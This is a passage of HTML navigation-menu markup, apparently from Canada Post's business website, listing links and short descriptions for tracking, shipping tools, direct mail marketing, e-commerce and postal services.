          <p>Quick links to online tools.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//track-reperage/en" class="" target="" alt="">Track a package</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//track-reperage/en" target="" alt="">
        <h3 class="submenu-header">Track a package<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//info/mc/personal/postalcode/fpc.jsf" class="" target="" alt="">Find a postal code</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//info/mc/personal/postalcode/fpc.jsf" target="" alt="">
        <h3 class="submenu-header">Find a postal code<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//info/mc/personal/postalcode/fpc.jsf" class="" target="" alt="">Find an address</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//info/mc/personal/postalcode/fpc.jsf" target="" alt="">
        <h3 class="submenu-header">Find an address<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//information/app/fpo/personal/findpostoffice" class="" target="" alt="">Find a post office</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/fpo/personal/findpostoffice" target="" alt="">
        <h3 class="submenu-header">Find a post office<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//information/app/fdl/business/findDepositLocation" class="" target="" alt="">Find a drop-off location</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/fdl/business/findDepositLocation" target="" alt="">
        <h3 class="submenu-header">Find a drop-off location<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/tools/delivery-standards.page?" class="" target="" alt="">Find a delivery standard</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/tools/delivery-standards.page?" target="" alt="">
        <h3 class="submenu-header">Find a delivery standard<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/package-redirection.page?" class="" target="" alt="">Package Redirection</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/package-redirection.page?" target="" alt="">
        <h3 class="submenu-header">Package Redirection<span class="open-new-window"></span></h3>
        <p>Redirect a shipment while in transit.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/shipping/track-find.page?" class="menu-title parent-link" target="" alt="">Access our quick tools</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/shipping/track-find.page?" target="" alt="">
          <h3 class="submenu-header">Access our quick tools<span class="open-new-window"></span></h3>
          <p>Quick links to track your parcel, find an address or postal code.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/shipping/find-rates-ship/snap-ship.page?" class="" target="" alt="">Snap Ship</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship/snap-ship.page?" target="" alt="">
        <h3 class="submenu-header">Snap Ship<span class="open-new-window"></span></h3>
        <p>Online shipping tool best for small businesses.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/find-rates-ship/shipping-manager.page?" class="" target="" alt="">Shipping Manager</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship/shipping-manager.page?" target="" alt="">
        <h3 class="submenu-header">Shipping Manager<span class="open-new-window"></span></h3>
        <p>Online shipping tool for large volume shippers with a parcels contract.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/request-pickup.page?" class="" target="" alt="">Request a pickup</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/request-pickup.page?" target="" alt="">
        <h3 class="submenu-header">Request a pickup<span class="open-new-window"></span></h3>
        <p>Have us pick up packages from your business for shipping.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/shipping/returns.page?" class="menu-title parent-link" target="" alt="">Simplify returns</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/shipping/returns.page?" target="" alt="">
          <h3 class="submenu-header">Simplify returns<span class="open-new-window"></span></h3>
          <p>Learn about how to create a returns strategy for your customers.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/shipping/returns/customer-return-policy.page?" class="" target="" alt="">Customer return policy</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/returns/customer-return-policy.page?" target="" alt="">
        <h3 class="submenu-header">Customer return policy<span class="open-new-window"></span></h3>
        <p>Create and manage return policies online, for free.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//blogs/business/category/shipping/" class="menu-title " target="_blank" alt="Opens in new tab">Get shipping resources and articles</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//blogs/business/category/shipping/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">Get shipping resources and articles<span class="open-new-window"></span></h3>
          <p>Business Matters blog.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/business/marketing.page?" class="parent-link" target="" alt="">Marketing</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/business/marketing.page?" target="" alt="">
              <h3 class="submenu-header">Marketing<span class="open-new-window"></span></h3>
                <p>Learn about direct mail campaigns and renting address data.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/business/marketing/campaign.page?" class="menu-title parent-link" target="" alt="">Launch a campaign</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/marketing/campaign.page?" target="" alt="">
          <h3 class="submenu-header">Launch a campaign<span class="open-new-window"></span></h3>
          <p>Compare our direct mail services to match your campaign goals.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox.page?" class="parent-link" target="" alt="">Reach every mailbox</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox.page?" target="" alt="">
        <h3 class="submenu-header">Reach every mailbox<span class="open-new-window"></span></h3>
        <p>Create a direct mail campaign online or with the help of a partner.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?" class="parent-link" target="" alt="">Precision Targeter</a>
          <div class="menu-item-level level4" data-level="5">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?" target="" alt="">
            <h3 class="submenu-header">Precision Targeter<span class="open-new-window"></span></h3>
            <p>Learn how to target the right audience for your campaign.</p>
            </a>
            </div> 
            <ul>
            
    <li>
      <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/get-to-the-tool.page?" class="" target="" alt="">Get to the tool</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/get-to-the-tool.page?" target="" alt="">Get to the tool</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/create-mailing-plan.page?" class="" target="" alt="">Create a mailing plan</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/create-mailing-plan.page?" target="" alt="">Create a mailing plan</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/review-your-mailing-plan.page?" class="" target="" alt="">Review your mailing plan</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/review-your-mailing-plan.page?" target="" alt="">Review your mailing plan</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/map-buttons.page?" class="" target="" alt="">Map buttons</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/map-buttons.page?" target="" alt="">Map buttons</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/data-view-buttons.page?" class="" target="" alt="">Data view buttons</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/data-view-buttons.page?" target="" alt="">Data view buttons</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/menu-buttons.page?" class="" target="" alt="">Menu buttons</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter/menu-buttons.page?" target="" alt="">Menu buttons</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//sam/" class="" target="" alt="">Snap Admail</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//sam/" target="" alt="">
            <h3 class="submenu-header">Snap Admail<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/tools/marketing/find-a-partner.page?" class="" target="" alt="">Find a partner</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/tools/marketing/find-a-partner.page?" target="" alt="">
            <h3 class="submenu-header">Find a partner<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?" class="" target="" alt="">Precision Targeter</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/marketing/campaign/reach-every-mailbox/precision-targeter.page?" target="" alt="">
            <h3 class="submenu-header">Precision Targeter<span class="open-new-window"></span></h3>
            <p>Precision Targeter</p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/campaign/discover-similar-customers.page?" class="" target="" alt="">Discover similar customers</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/discover-similar-customers.page?" target="" alt="">
        <h3 class="submenu-header">Discover similar customers<span class="open-new-window"></span></h3>
        <p>Effectively target potential customers using postal code data.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/campaign/send-personalized-mail.page?" class="" target="" alt="">Send Personalized Mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/send-personalized-mail.page?" target="" alt="">
        <h3 class="submenu-header">Send Personalized Mail<span class="open-new-window"></span></h3>
        <p>Launch a campaign with personalized, addressed direct mail.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/campaign/why-direct-mail-marketing.page?" class="" target="" alt="">Why direct mail marketing?</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/campaign/why-direct-mail-marketing.page?" target="" alt="">
        <h3 class="submenu-header">Why direct mail marketing?<span class="open-new-window"></span></h3>
        <p>Our research shows how direct mail supports marketing campaigns.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/marketing/audience.page?" class="menu-title parent-link" target="" alt="">Audience insights and solutions</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/marketing/audience.page?" target="" alt="">
          <h3 class="submenu-header">Audience insights and solutions<span class="open-new-window"></span></h3>
          <p>Access targeted customer lists to boost your sales.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/marketing/audience/rent-list.page?" class="parent-link" target="" alt="">Rent our prospect lists</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/audience/rent-list.page?" target="" alt="">
        <h3 class="submenu-header">Rent our prospect lists<span class="open-new-window"></span></h3>
        <p>Use the most current address data to target and segment customers.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/marketing/audience/clean-list.page?" class="" target="" alt="">NCOA Mover Data</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/marketing/audience/clean-list.page?" target="" alt="">
            <h3 class="submenu-header">NCOA Mover Data<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/audience/clean-list.page?" class="parent-link" target="" alt="">Clean your customer lists</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/audience/clean-list.page?" target="" alt="">
        <h3 class="submenu-header">Clean your customer lists<span class="open-new-window"></span></h3>
        <p>Learn about services that increase the accuracy of customer data.  </p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/marketing/audience/clean-your-customer-lists/ncoa-mover-data-service.page?" class="" target="" alt="">NCOA mover data service</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/marketing/audience/clean-your-customer-lists/ncoa-mover-data-service.page?" target="" alt="">
            <h3 class="submenu-header">NCOA mover data service<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/audience/insights.page?" class="" target="" alt="">Get audience insights</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/audience/insights.page?" target="" alt="">
        <h3 class="submenu-header">Get audience insights<span class="open-new-window"></span></h3>
        <p>Analyze campaign data to optimize future campaigns.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/marketing/audience/license-data.page?" class="" target="" alt="">License our data</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/marketing/audience/license-data.page?" target="" alt="">
        <h3 class="submenu-header">License our data<span class="open-new-window"></span></h3>
        <p>Use our data products to create your campaign mailing lists.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//blogs/business/category/marketing/" class="menu-title " target="_blank" alt="Opens in new tab">Get marketing resources and articles</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//blogs/business/category/marketing/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">Get marketing resources and articles<span class="open-new-window"></span></h3>
          <p>Business Matters blog.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/business/ecommerce.page?" class="parent-link" target="" alt="">E-commerce</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/business/ecommerce.page?" target="" alt="">
              <h3 class="submenu-header">E-commerce<span class="open-new-window"></span></h3>
                <p>Learn about services to support your online business for customers.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/business/ecommerce/start-selling-online.page?" class="menu-title " target="" alt="">Start selling online</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/ecommerce/start-selling-online.page?" target="" alt="">
          <h3 class="submenu-header">Start selling online<span class="open-new-window"></span></h3>
          <p>Learn about setting up your online store with our partners.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/ecommerce/ecommerce-awards/home.page" class="menu-title " target="_blank" alt="Opens in new tab">E-commerce Innovation Awards</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/ecommerce/ecommerce-awards/home.page" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">E-commerce Innovation Awards<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/ecommerce/enhance.page?" class="menu-title parent-link" target="" alt="">Enhance your e-commerce operations</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/ecommerce/enhance.page?" target="" alt="">
          <h3 class="submenu-header">Enhance your e-commerce operations<span class="open-new-window"></span></h3>
          <p>Learn about services to enable online purchase, delivery and returns.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/ecommerce/enhance/verify-addresses.page?" class="" target="" alt="">Verify customer addresses</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/ecommerce/enhance/verify-addresses.page?" target="" alt="">
        <h3 class="submenu-header">Verify customer addresses<span class="open-new-window"></span></h3>
        <p>Integrate AddressComplete™ to improve your online checkout experience.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/ecommerce/enhance/display-rates-delivery-dates.page?" class="" target="" alt="">Display rates and delivery dates</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/ecommerce/enhance/display-rates-delivery-dates.page?" target="" alt="">
        <h3 class="submenu-header">Display rates and delivery dates<span class="open-new-window"></span></h3>
        <p>Integrate shipping costs and speeds directly in your online checkout.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/request-pickup.page?" class="" target="" alt="">Request a pickup</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/request-pickup.page?" target="" alt="">
        <h3 class="submenu-header">Request a pickup<span class="open-new-window"></span></h3>
        <p>Have us pick up packages from your business for shipping.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/ecommerce/enhance/parcel-tracking.page?" class="" target="" alt="">Provide parcel tracking</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/ecommerce/enhance/parcel-tracking.page?" target="" alt="">
        <h3 class="submenu-header">Provide parcel tracking<span class="open-new-window"></span></h3>
        <p>Add tracking to your website and let customers track their purchase.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/ecommerce/enhance/ship-from-store.page?" class="" target="" alt="">Ship from a store</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/ecommerce/enhance/ship-from-store.page?" target="" alt="">
        <h3 class="submenu-header">Ship from a store<span class="open-new-window"></span></h3>
        <p>Ship online purchases to customers from the closest retail store.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/ecommerce/enhance/deliver-to-post-office.page?" class="" target="" alt="">Deliver to a post office</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/ecommerce/enhance/deliver-to-post-office.page?" target="" alt="">
        <h3 class="submenu-header">Deliver to a post office<span class="open-new-window"></span></h3>
        <p>Offer post office pickup of purchases to your customers.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/returns.page?" class="" target="" alt="">Simplify returns</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/returns.page?" target="" alt="">
        <h3 class="submenu-header">Simplify returns<span class="open-new-window"></span></h3>
        <p>Create the best returns experience for your customers.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/ecommerce/integrate-apis.page?" class="menu-title " target="" alt="">Integrate with our APIs</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/ecommerce/integrate-apis.page?" target="" alt="">
          <h3 class="submenu-header">Integrate with our APIs<span class="open-new-window"></span></h3>
          <p>Use free APIs to integrate our services directly with your website.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//blogs/business/category/ecommerce/" class="menu-title " target="_blank" alt="Opens in new tab">Get e-commerce resources and articles</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//blogs/business/category/ecommerce/" target="_blank" alt="Opens in new tab">
          <h3 class="submenu-header">Get e-commerce resources and articles<span class="open-new-window"></span></h3>
          <p>Business Matters blog.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/business/small-business.page?" class="parent-link" target="" alt="">Small business</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/business/small-business.page?" target="" alt="">
              <h3 class="submenu-header">Small business<span class="open-new-window"></span></h3>
                <p>Learn about shipping tools and discounts tailored for small business.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/business/small-business/shipping-discounts.page?" class="menu-title " target="" alt="">Shipping discounts</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/small-business/shipping-discounts.page?" target="" alt="">
          <h3 class="submenu-header">Shipping discounts<span class="open-new-window"></span></h3>
          <p>Learn about savings program discount levels.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/ecommerce/start-selling-online.page?" class="menu-title " target="" alt="">Start selling online</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/ecommerce/start-selling-online.page?" target="" alt="">
          <h3 class="submenu-header">Start selling online<span class="open-new-window"></span></h3>
          <p>Learn about setting up your online store with our partners. </p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/small-business/third-party-discounts.page?" class="menu-title " target="" alt="">Exclusive discounts</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/small-business/third-party-discounts.page?" target="" alt="">
          <h3 class="submenu-header">Exclusive discounts<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/small-business/direct-mail-savings.page?" class="menu-title " target="" alt="">Direct mail discounts</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/small-business/direct-mail-savings.page?" target="" alt="">
          <h3 class="submenu-header">Direct mail discounts<span class="open-new-window"></span></h3>
          <p>Learn about small business savings on direct mail marketing campaigns.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/shipping/find-rates-ship/snap-ship.page?" class="menu-title " target="" alt="">Snap Ship</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship/snap-ship.page?" target="" alt="">
          <h3 class="submenu-header">Snap Ship<span class="open-new-window"></span></h3>
          <p>Create shipping labels online and access discounted rates.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/business/postal-services.page?" class="parent-link" target="" alt="">Postal services</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/business/postal-services.page?" target="" alt="">
              <h3 class="submenu-header">Postal services<span class="open-new-window"></span></h3>
                <p>Learn about mailing services to support your business operations.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/business/postal-services/mailing.page?" class="menu-title parent-link" target="" alt="">Mailing</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/postal-services/mailing.page?" target="" alt="">
          <h3 class="submenu-header">Mailing<span class="open-new-window"></span></h3>
          <p>Learn about services to manage your business mailings.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/postal-services/mailing/letter-discounts.page?" class="" target="" alt="">Get business letter discounts</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/mailing/letter-discounts.page?" target="" alt="">
        <h3 class="submenu-header">Get business letter discounts<span class="open-new-window"></span></h3>
        <p>Learn about savings on large-volume business correspondence mail. </p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/postal-services/mailing/send-publications.page?" class="" target="" alt="">Send publications</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/mailing/send-publications.page?" target="" alt="">
        <h3 class="submenu-header">Send publications<span class="open-new-window"></span></h3>
        <p>Access lower postage rates on magazines, newspapers and newsletters.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/postal-services/mailing/prepaid-reply-mail.page?" class="parent-link" target="" alt="">Prepaid reply mail</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/mailing/prepaid-reply-mail.page?" target="" alt="">
        <h3 class="submenu-header">Prepaid reply mail<span class="open-new-window"></span></h3>
        <p>Include postage-paid return mail as part of direct mail campaigns.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/postal-services/mailing/prepaid-reply-mail/design-track.page?" class="" target="" alt="">Design and track reply mail</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/postal-services/mailing/prepaid-reply-mail/design-track.page?" target="" alt="">
            <h3 class="submenu-header">Design and track reply mail<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/receiving/manage-mail/mail-forwarding.page?" class="" target="" alt="">Forward your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/manage-mail/mail-forwarding.page?" target="" alt="">
        <h3 class="submenu-header">Forward your mail<span class="open-new-window"></span></h3>
        <p>Forward mail to a new or temporary address.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/receiving/manage-mail/hold-mail.page?" class="" target="" alt="">Hold your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/manage-mail/hold-mail.page?" target="" alt="">
        <h3 class="submenu-header">Hold your mail<span class="open-new-window"></span></h3>
        <p>Temporarily stop mail delivery to your address.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/postal-services/mailing/register.page?" class="" target="" alt="">Register your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/postal-services/mailing/register.page?" target="" alt="">
        <h3 class="submenu-header">Register your mail<span class="open-new-window"></span></h3>
        <p>Pay a flat rate for Registered Mail™ and get a signature upon arrival.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/postal-services/money-prepaid-cards.page?" class="menu-title parent-link" target="" alt="">Money services and prepaid cards</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/postal-services/money-prepaid-cards.page?" target="" alt="">
